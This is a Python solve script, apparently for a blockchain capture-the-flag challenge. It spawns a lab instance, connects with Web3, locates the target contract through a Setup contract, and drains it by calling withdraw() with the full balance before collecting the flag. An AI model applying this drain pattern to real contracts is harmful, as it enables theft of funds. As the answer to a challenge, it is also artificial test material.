
from web3 import Web3
from blockchain import compile_contract
from platypwn_helper import spawn_instance, get_flag, kill_instance

spawner = ("<server_ip>", 31337)

d = spawn_instance(spawner)

rpc = d["RPC"]

privateKey = d["PrivateKey"]
address = d["Address"]
setupAddress = d["setupAddress"]

w3 = Web3(Web3.HTTPProvider(rpc))
acct = w3.eth.account.from_key(privateKey)
w3.eth.default_account = acct.address


setup_abi, setup_bytecode = compile_contract('Setup.sol')
chal_abi, chal_bytecode = compile_contract('Chal.sol')

setup_instance = w3.eth.contract(address=setupAddress, abi=setup_abi, bytecode=setup_bytecode)

targetAddress = setup_instance.functions.TARGET().call()

chal_instance = w3.eth.contract(address=targetAddress, abi=chal_abi, bytecode=chal_bytecode)

balance = chal_instance.functions.getBalance().call()
tx_hash = chal_instance.functions.withdraw(balance).transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)


print(get_flag(spawner))

kill_instance(spawner)

